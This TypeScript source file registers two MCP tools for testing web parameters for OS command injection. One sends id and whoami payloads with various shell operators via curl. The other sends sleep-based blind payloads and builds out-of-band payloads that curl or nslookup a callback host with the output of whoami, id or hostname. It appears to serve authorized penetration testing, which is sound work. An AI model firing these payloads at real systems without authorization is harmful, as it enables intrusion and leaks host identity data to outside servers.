/**
 * Command Injection testing tools.
 *
 * Wraps OS command injection techniques with various operators and blind detection.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "cmdi_test",
    "Test command injection using various shell operators. Tests ;, &&, ||, |, backtick, $(), and %0a (newline) operators with 'id' and 'whoami' as detection commands. Returns results array with operator, payload, status, output_snippet, likely_vulnerable. Side effects: Read-only detection commands (id, whoami). Sends ~14 requests.",
    {
      url: z.string().describe("Target URL that processes the parameter server-side"),
      parameter: z.string().describe("Vulnerable parameter name, e.g. 'storeId'"),
      base_value: z.string().optional().describe("Legitimate value for the parameter, e.g. '1'"),
      method: z.enum(["GET", "POST"]).optional().describe("HTTP method"),
      operators: z.array(z.string()).optional().describe("Injection operators to test. Default: all common operators."),
    },
    async ({ url, parameter, base_value = "1", method = "POST", operators }) => {
      requireTool("curl");

      const defaultOperators = [";", "&&", "||", "|", "`", "$()", "%0a"];
      const testOperators = operators ?? defaultOperators;

      const detectionCommands: Record<string, string[]> = {
        ";": [`${base_value};id`, `${base_value};whoami`],
        "&&": [`${base_value}&&id`, `${base_value}&&whoami`],
        "||": [`${base_value}||id`, `invalid||whoami`],
        "|": [`${base_value}|id`, `${base_value}|whoami`],
        "`": [`${base_value}\`id\``, `${base_value}\`whoami\``],
        "$()": [`${base_value}$(id)`, `${base_value}$(whoami)`],
        "%0a": [`${base_value}%0aid`, `${base_value}%0awhoami`],
      };

      const results = [];
      for (const op of testOperators) {
        if (!(op in detectionCommands)) {
          continue;
        }
        for (const payload of detectionCommands[op]) {
          let curlArgs: string[];
          if (method === "GET") {
            curlArgs = [
              "-sk",
              "-o", "-",
              "-w", "\n__STATUS__%{http_code}",
              `${url}?${parameter}=${payload}`,
            ];
          } else {
            curlArgs = [
              "-sk",
              "-o", "-",
              "-w", "\n__STATUS__%{http_code}",
              "-X", "POST",
              "-d", `${parameter}=${payload}`,
              url,
            ];
          }

          const res = await runCmd("curl", curlArgs);
          let body = res.stdout;
          const statusMarker = body.lastIndexOf("__STATUS__");
          let status = 0;
          if (statusMarker !== -1) {
            try {
              status = parseInt(body.slice(statusMarker + 10).trim(), 10);
            } catch {
              // leave status as 0
            }
            body = body.slice(0, statusMarker);
          }

          // Check for command output indicators
          const indicators = ["uid=", "gid=", "root", "www-data", "nobody", "apache", "nginx"];
          const likely = indicators.some((ind) => body.toLowerCase().includes(ind));

          results.push({
            operator: op,
            payload,
            status,
            output_snippet: body.slice(0, 300),
            likely_vulnerable: likely,
          });
        }
      }

      const vulnerableOps = [...new Set(results.filter((r) => r.likely_vulnerable).map((r) => r.operator))];
      const result = {
        results,
        vulnerable_operators: vulnerableOps,
        vulnerable: vulnerableOps.length > 0,
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "cmdi_blind_detect",
    "Detect blind command injection via time delay and OOB callbacks. Tests sleep-based delay detection and optional out-of-band (curl/nslookup to callback). Returns time_based results array and oob_payloads list. Side effects: Executes sleep on target if vulnerable. OOB payloads call back to callback_url.",
    {
      url: z.string().describe("Target URL"),
      parameter: z.string().describe("Vulnerable parameter name"),
      base_value: z.string().optional().describe("Legitimate parameter value"),
      method: z.enum(["GET", "POST"]).optional().describe("HTTP method"),
      callback_url: z.string().optional().describe("Out-of-band callback URL for OOB detection (e.g. Burp Collaborator)"),
      delay_seconds: z.number().min(1).max(10).optional().describe("Sleep duration for time-based detection"),
    },
    async ({ url, parameter, base_value = "1", method = "POST", callback_url, delay_seconds = 5 }) => {
      requireTool("curl");

      const cb = callback_url ?? "https://collaborator.example.com";

      // Time-based payloads
      const sleepPayloads = [
        `${base_value};sleep ${delay_seconds}`,
        `${base_value}&&sleep ${delay_seconds}`,
        `${base_value}|sleep ${delay_seconds}`,
        `${base_value}\`sleep ${delay_seconds}\``,
        `${base_value}$(sleep ${delay_seconds})`,
      ];

      const timeResults = [];
      for (const payload of sleepPayloads) {
        let curlArgs: string[];
        if (method === "GET") {
          curlArgs = [
            "-sk", "-o", "/dev/null",
            "-w", "%{time_total}",
            `${url}?${parameter}=${payload}`,
          ];
        } else {
          curlArgs = [
            "-sk", "-o", "/dev/null",
            "-w", "%{time_total}",
            "-X", "POST",
            "-d", `${parameter}=${payload}`,
            url,
          ];
        }

        const res = await runCmd("curl", curlArgs, { timeout: delay_seconds + 15 });
        let elapsed = 0.0;
        try {
          elapsed = parseFloat(res.stdout);
          if (isNaN(elapsed)) elapsed = 0.0;
        } catch {
          elapsed = 0.0;
        }

        const triggered = elapsed >= delay_seconds * 0.8;
        timeResults.push({
          payload,
          elapsed_seconds: Math.round(elapsed * 100) / 100,
          triggered,
        });
      }

      // OOB payloads (generate but don't verify — user checks collaborator)
      const cbHost = cb.replace("https://", "").replace("http://", "");
      const oobPayloads = [
        `${base_value};curl ${cb}/$(whoami)`,
        `${base_value};nslookup $(whoami).${cbHost}`,
        `${base_value}$(curl ${cb}/$(id))`,
        `${base_value}\`curl ${cb}/$(hostname)\``,
      ];

      const anyTriggered = timeResults.some((r) => r.triggered);
      const result = {
        time_based_vulnerable: anyTriggered,
        time_results: timeResults,
        oob_payloads_generated: oobPayloads,
        hint: callback_url
          ? "Check your callback server for OOB interactions after sending these payloads manually."
          : "Set callback_url for out-of-band detection.",
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );
}
